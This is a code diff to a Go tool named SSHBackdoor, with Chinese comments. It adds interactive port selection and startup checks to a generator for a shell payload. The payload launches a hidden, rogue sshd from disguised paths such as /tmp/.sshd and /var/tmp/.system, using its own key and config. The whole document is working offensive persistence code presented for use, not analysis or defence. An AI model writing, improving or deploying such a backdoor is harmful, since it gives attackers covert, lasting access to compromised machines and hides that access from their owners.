@@ -1,9 +1,14 @@
 package ssh
 
 import (
+	"bufio"
 	"fmt"
+	"net"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"strconv"
+	"strings"
 	"text/template"
 	"time"
 )
@@ -14,12 +19,62 @@ type SSHBackdoor struct {
 	KeyPath  string
 }
 
-func NewSSHBackdoor() *SSHBackdoor {
-	return &SSHBackdoor{
-		Port:     2323,
+// 检查端口是否可用
+func isPortAvailable(port int) bool {
+	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
+	if err != nil {
+		return false
+	}
+	ln.Close()
+	return true
+}
+
+// 获取用户输入
+func getUserInput(prompt string) string {
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print(prompt)
+	input, _ := reader.ReadString('\n')
+	return strings.TrimSpace(input)
+}
+
+func NewSSHBackdoor() (*SSHBackdoor, error) {
+	// 默认值
+	backdoor := &SSHBackdoor{
 		LinkPath: "/tmp/.sshd",
 		KeyPath:  "/tmp/.ssh_key",
 	}
+
+	// 获取并验证端口
+	for {
+		portStr := getUserInput("请输入SSH后门端口 (1024-65535): ")
+		port, err := strconv.Atoi(portStr)
+		if err != nil {
+			fmt.Println("[-] 错误: 请输入有效的数字")
+			continue
+		}
+
+		if port < 1024 || port > 65535 {
+			fmt.Println("[-] 错误: 端口必须在1024-65535之间")
+			continue
+		}
+
+		if !isPortAvailable(port) {
+			fmt.Printf("[-] 错误: 端口 %d 已被占用\n", port)
+			// 显示当前端口使用情况
+			fmt.Println("\n当前端口使用情况:")
+			fmt.Println("-------------------")
+			output, _ := exec.Command("netstat", "-tlnp").Output()
+			fmt.Println(string(output))
+			fmt.Println("-------------------")
+			continue
+		}
+
+		backdoor.Port = port
+		fmt.Printf("[+] 端口 %d 可用\n", port)
+		break
+	}
+
+	return backdoor, nil
 }
 
 func (s *SSHBackdoor) GeneratePayload(outDir string) error {
@@ -30,6 +85,13 @@ func (s *SSHBackdoor) GeneratePayload(outDir string) error {
 SSH_PORT={{.Port}}
 LINK_PATH="{{.LinkPath}}"
 KEY_PATH="{{.KeyPath}}"
+
+# 验证端口可用性
+if netstat -tlnp 2>/dev/null | grep -q ":$SSH_PORT "; then
+    echo "[-] 错误: 端口 $SSH_PORT 已被占用"
+    netstat -tlnp | grep ":$SSH_PORT "
+    exit 1
+fi
 
 # 创建隐藏目录
 HIDE_DIR="/var/tmp/.system"
@@ -85,6 +147,17 @@ $LINK_PATH -f /tmp/sshd_config -D -E /tmp/sshd.log &
 sleep 2
 
 echo "[+] 验证SSH服务状态..."
+if ! ps aux | grep -q "$LINK_PATH"; then
+    echo "[-] 错误: SSH服务启动失败"
+    tail -n 20 /tmp/sshd.log
+    exit 1
+fi
+
+if ! netstat -tlnp 2>/dev/null | grep -q ":$SSH_PORT "; then
+    echo "[-] 错误: 端口 $SSH_PORT 未在监听"
+    exit 1
+fi
+
 ps aux | grep sshd
 netstat -tlnp | grep $SSH_PORT
 
